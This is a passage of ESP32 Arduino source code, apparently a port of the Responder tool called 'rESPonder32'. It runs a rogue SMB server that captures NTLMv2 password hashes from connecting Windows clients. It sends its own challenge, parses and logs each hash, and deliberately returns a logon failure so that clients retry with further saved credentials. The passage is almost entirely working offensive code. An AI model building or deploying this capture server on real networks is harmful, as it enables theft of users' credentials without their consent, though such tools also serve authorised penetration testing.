        Serial.printf("[SMB] Expected SESSION_SETUP (0x73), got 0x%02x from %s\n",
                      buf[4], client_ip);
        return;
    }

    // Reply with STATUS_MORE_PROCESSING_REQUIRED and our challenge blob
    rlen = buildSessionSetupChallenge(buf, plen, resp, sizeof(resp), smbChallenge);
    if (rlen < 0) {
        Serial.printf("[SMB] Failed to build challenge response for %s\n", client_ip);
        return;
    }
    if (!sendSMBPDU(fd, resp, rlen)) {
        Serial.printf("[SMB] Failed to send challenge to %s\n", client_ip);
        return;
    }

    // Step 3: receive second Session Setup (NTLMSSP Type 3 — the actual hash)
    plen = recvSMBPDU(fd, buf, sizeof(buf));
    if (plen < 10) {
        Serial.printf("[SMB] Auth packet: short read from %s\n", client_ip);
        return;
    }
    if (buf[4] != 0x73) {
        Serial.printf("[SMB] Expected second SESSION_SETUP (0x73), got 0x%02x from %s\n",
                      buf[4], client_ip);
        return;
    }

    String hash = parseNTLMv2Hash(buf, plen, smbChallenge);
    if (hash.length() > 0) {
        capturedHashes.push_back(hash);
        Serial.printf("[SMB] Hash captured from %s: %s\n", client_ip, hash.c_str());
    } else {
        Serial.printf("[SMB] Anonymous or malformed auth from %s\n", client_ip);
    }

    // Send STATUS_LOGON_FAILURE to make the client retry — captures more hashes
    // if the client tries multiple credential sets (e.g. cached/saved passwords).
    uint16_t pid = (uint16_t)buf[30] | ((uint16_t)buf[31] << 8);
    uint16_t uid = (uint16_t)buf[32] | ((uint16_t)buf[33] << 8);
    uint16_t mid = (uint16_t)buf[34] | ((uint16_t)buf[35] << 8);

    uint8_t empty_body[3] = { 0x00, 0x00, 0x00 };  // SMBSessEmpty from packets.py
    int hw = buildSMBHeader(resp, sizeof(resp),
                             0x73,
                             0x98,          // flag1: \x98 from SMB1.handle() success path
                             0x01c8,        // flag2
                             0xc000006dUL,  // STATUS_LOGON_FAILURE
                             pid, uid, 0, mid);
    if (hw > 0) {
        memcpy(resp + hw, empty_body, 3);
        sendSMBPDU(fd, resp, hw + 3);
    }
}

// ---------------------------------------------------------------------------
// Arduino entry points
// ---------------------------------------------------------------------------

void setup() {
    Serial.begin(115200);
    Serial.println("\n[rESPonder32] SMB Server v0.1");

    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    Serial.print("[rESPonder32] Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
        delay(100);
        Serial.print('.');
    }
    Serial.println();

    uint8_t myIP[4] = { 127, 0, 0, 1 };
    detectHostIP(myIP);
    Serial.printf("[rESPonder32] Host IP: %d.%d.%d.%d\n",
                  myIP[0], myIP[1], myIP[2], myIP[3]);

    // Generate 8-byte random challenge using two 32-bit esp_random() calls.
    // From CLAUDE.md: "esp_random() × 2 (two 32-bit randoms → 8 bytes)"
    uint32_t r0 = esp_random(), r1 = esp_random();
    memcpy(smbChallenge,     &r0, 4);
    memcpy(smbChallenge + 4, &r1, 4);
    Serial.printf("[SMB] Challenge: %02x%02x%02x%02x%02x%02x%02x%02x\n",
                  smbChallenge[0], smbChallenge[1], smbChallenge[2], smbChallenge[3],
                  smbChallenge[4], smbChallenge[5], smbChallenge[6], smbChallenge[7]);

    // Try port 445 first; fall back to 4450 if bind fails (no root in emulator)
    smbServer = new WiFiServer(SMB_PORT);
    smbServer->begin();
    if (!(*smbServer)) {
        Serial.printf("[SMB] Port %d failed, falling back to %d\n",
                      SMB_PORT, SMB_FALLBACK_PORT);
        delete smbServer;
        smbServer = new WiFiServer(SMB_FALLBACK_PORT);
        smbServer->begin();
        actualPort = SMB_FALLBACK_PORT;
    } else {
        actualPort = SMB_PORT;
    }

    if (!(*smbServer)) {
        Serial.println("[SMB] ERROR: could not bind on any port");
        return;
    }

    Serial.printf("[SMB] Listening on TCP port %d\n", actualPort);
    Serial.println("[SMB] Ready to capture NTLMv2 hashes");
}

void loop() {
    WiFiClient client = smbServer->available();
    if (!client) {
        delay(1);
        return;
    }

    // Get remote IP before handing off (available() returns a pre-accepted fd)
    char client_ip[32] = "unknown";
    {
        struct sockaddr_in peer{};
        socklen_t plen = sizeof(peer);
        if (getpeername(client.fd(), (struct sockaddr*)&peer, &plen) == 0)
            inet_ntop(AF_INET, &peer.sin_addr, client_ip, sizeof(client_ip));
    }

    handleSMBClient(std::move(client), client_ip);
}
